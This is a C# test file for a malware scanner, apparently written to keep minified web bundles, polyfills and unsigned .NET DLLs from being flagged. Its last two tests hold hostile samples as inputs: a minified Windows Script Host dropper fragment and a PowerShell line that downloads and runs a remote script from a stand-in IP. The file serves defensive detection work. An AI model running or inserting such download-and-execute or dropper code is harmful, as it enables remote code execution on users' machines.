using Nexus.Core.Security;
using Nexus.Core.Security.StaticAnalysis;
using Xunit;

namespace Nexus.Core.Tests;

/// <summary>
/// These tests come from a real machine, not from imagination.
///
/// A scan of an ordinary developer folder produced 948 findings. 819 were minified
/// web bundles and 180 were .NET DLLs; essentially none of them were malicious. Each
/// test here reproduces one of the shapes that caused that, so a future rule change
/// cannot quietly bring the noise back.
///
/// The last two guard the other direction: quieting the noise must not become a way
/// for real malware to hide.
/// </summary>
public class FalsePositiveRegressionTests
{
    /// <summary>A slice of jquery-3.2.1.min.js, which Nexus scored 68/100 "looks malicious".</summary>
    private const string MinifiedJQuery = @"!function(e,t){""object""==typeof module&&""object""==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(""jQuery requires a window with a document"");return t(e)}:t(e)}(""undefined""!=typeof window?window:this,function(e,t){var n=[],r=e.document,i=n.slice,o=n.concat,a=n.push,s=n.indexOf,u={},l=u.toString,c=u.hasOwnProperty,f={},d=""3.2.1"",p=function(e,t){return new p.fn.init(e,t)},g=/^-ms-/,v=/-([a-z])/g,y=function(e,t){return t.toUpperCase()};p.fn=p.prototype={jquery:d,constructor:p,length:0,toArray:function(){return i.call(this)},get:function(e){return null==e?i.call(this):e<0?this[e+this.length]:this[e]},each:function(e){return p.each(this,e)},map:function(e){return this.pushStack(p.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(i.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)}};";

    private static Verdict Judge(string path, params SecuritySignal[] signals) =>
        VerdictEngine.Evaluate(new VerdictInput
        {
            Target = ScanTarget.ForFile(path, "0123456789abcdef"),
            Signals = signals,
        }, DateTimeOffset.UnixEpoch);

    private static SecuritySignal Unsigned() => new(
        SignalSource.CodeSignature,
        SignalWeight.Weak,
        "sig-unsigned",
        "This file carries no digital signature.");

    // ---- The two shapes that produced the noise ----

    [Fact]
    public void A_minified_web_bundle_is_not_reported_as_obfuscated()
    {
        var codes = ScriptAnalyzer.Analyse(MinifiedJQuery, ScriptKind.JavaScript)
            .Select(s => s.Code)
            .ToArray();

        // Minifiers produce exactly the surface those rules were written to catch —
        // single-character names, no whitespace, string indexing — but they do it to
        // every web bundle on earth. Whatever is noticed here must be worth nothing.
        Assert.All(ScriptAnalyzer.Analyse(MinifiedJQuery, ScriptKind.JavaScript),
            s => Assert.Equal(0, s.Points));

        Assert.DoesNotContain("script-windows-script-host", codes);
    }

    /// <summary>
    /// core-js writes <c>new ActiveXObject("htmlfile")</c> and every pre-2015 XHR
    /// shim asks for MSXML2.XMLHTTP. Those two strings were the entire remaining
    /// cause of false positives once the obfuscation rules were dealt with: eight
    /// files in one Next.js project, all of them polyfills.
    /// </summary>
    [Fact]
    public void An_internet_explorer_polyfill_is_not_a_windows_script_host_dropper()
    {
        const string polyfill =
            @"var f=function(){try{r=new ActiveXObject(""htmlfile"")}catch(t){}};" +
            @"var u=!i.ActiveXObject&&""ActiveXObject""in i;" +
            @"function x(){return new ActiveXObject(""MSXML2.XMLHTTP"")}";

        var signals = ScriptAnalyzer.Analyse(polyfill, ScriptKind.JavaScript);

        Assert.DoesNotContain("script-windows-script-host", signals.Select(s => s.Code));
        Assert.All(signals, s => Assert.Equal(0, s.Points));
    }

    /// <summary>
    /// typescript.js is a compiler: it calls String.fromCharCode on nearly every
    /// line, because that is what a lexer does. It was scored 57/100. Nothing about
    /// a parser should read as malicious.
    /// </summary>
    [Fact]
    public void A_javascript_lexer_is_not_reported_as_obfuscated()
    {
        const string lexer =
            @"function scan(t){var c=String.fromCharCode(t.charCodeAt(0)+1);" +
            @"if(c===""\u0041""||c===""\x42""){return eval(""(""+t+"")"")}" +
            @"return atob(t.slice(4))}";

        Assert.All(ScriptAnalyzer.Analyse(lexer, ScriptKind.JavaScript),
            s => Assert.Equal(0, s.Points));
    }

    [Fact]
    public void A_minified_bundle_does_not_warrant_an_alert_even_when_unsigned()
    {
        SecuritySignal[] signals =
            [.. ScriptAnalyzer.Analyse(MinifiedJQuery, ScriptKind.JavaScript), Unsigned()];

        var verdict = Judge(@"C:\site\js\jquery-3.2.1.min.js", signals);

        Assert.False(verdict.WarrantsAlert,
            $"jquery.min.js scored {verdict.Score}/100 as {verdict.Level}");
    }

    /// <summary>
    /// An unsigned .NET DLL with a deterministic build stamp. That combination — two
    /// Weak signals — accounted for 180 findings on the reporting machine.
    /// </summary>
    [Fact]
    public void An_unsigned_dotnet_library_does_not_warrant_an_alert()
    {
        var parsed = PeImage.TryParse(new PeBuilder()
            .AsDll()
            .AsManaged()
            .AddLowEntropySection()
            .WithTimestamp(DateTimeOffset.UtcNow.AddYears(30))
            .Build());

        Assert.NotNull(parsed);

        SecuritySignal[] signals = [.. PeHeuristics.Evaluate(parsed), Unsigned()];
        var verdict = Judge(@"C:\app\Some.Library.dll", signals);

        Assert.False(verdict.WarrantsAlert,
            $"an ordinary .NET DLL scored {verdict.Score}/100 as {verdict.Level}");
    }

    // ---- The quieting must not become a hiding place ----

    /// <summary>
    /// The obvious way to abuse the minified-bundle exemption is to minify a dropper.
    /// Windows Script Host APIs are checked regardless of minification, because a
    /// browser bundle has no reason to reach for them and a .js dropper cannot work
    /// without them.
    /// </summary>
    [Fact]
    public void A_minified_dropper_is_still_reported()
    {
        string dropper = MinifiedJQuery +
            @"var s=new ActiveXObject(""WScript.Shell""),f=new ActiveXObject(" +
            @"""Scripting.FileSystemObject""),x=new ActiveXObject(""ADODB.Stream"");";

        var codes = ScriptAnalyzer.Analyse(dropper, ScriptKind.JavaScript)
            .Select(s => s.Code)
            .ToArray();

        Assert.Contains("script-windows-script-host", codes);
    }

    [Fact]
    public void A_readable_powershell_downloader_is_still_reported()
    {
        // The exemption is scoped to JavaScript and HTML; PowerShell is untouched.
        const string script =
            "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')";

        SecuritySignal[] signals =
            [.. ScriptAnalyzer.Analyse(script, ScriptKind.PowerShell), Unsigned()];

        var verdict = Judge(@"C:\Users\me\Downloads\update.ps1", signals);

        Assert.True(verdict.WarrantsAlert,
            $"a plain downloader scored only {verdict.Score}/100 as {verdict.Level}");
    }
}
